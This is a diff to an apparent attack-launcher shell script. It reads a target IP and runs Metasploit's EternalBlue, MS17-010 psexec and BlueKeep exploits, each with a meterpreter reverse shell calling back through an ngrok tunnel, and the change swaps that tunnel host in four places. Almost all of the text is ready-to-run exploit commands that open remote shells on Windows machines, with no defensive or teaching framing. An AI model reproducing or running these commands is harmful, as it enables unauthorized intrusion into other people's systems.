@@ -184,7 +184,7 @@ echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t1
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue;
 set payload windows/x64/meterpreter/reverse_tcp;
-set lhost 0.tcp.ngrok.io;
+set lhost 6.tcp.ngrok.io;
 set lport $ngrok_port;
 set ReverseListenerBindHost localhost;
 set ReverseListenerBindPort 4444;
@@ -195,7 +195,7 @@ echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t2
 msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec;
 set payload windows/x64/meterpreter/reverse_tcp;
-set lhost 0.tcp.ngrok.io;
+set lhost 6.tcp.ngrok.io;
 set lport $ngrok_port;
 set ReverseListenerBindHost localhost;
 set ReverseListenerBindPort 4444;
@@ -206,7 +206,7 @@ echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t3
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue_win8;
 set payload windows/x64/meterpreter/reverse_tcp;
-set lhost 0.tcp.ngrok.io;
+set lhost 6.tcp.ngrok.io;
 set lport $ngrok_port;
 set ReverseListenerBindHost localhost;
 set ReverseListenerBindPort 4444;
@@ -217,7 +217,7 @@ echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t4
 msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce;
 set payload windows/x64/meterpreter/reverse_tcp;
-set lhost 0.tcp.ngrok.io;
+set lhost 6.tcp.ngrok.io;
 set lport $ngrok_port;
 set ReverseListenerBindHost localhost;
 set ReverseListenerBindPort 4444;
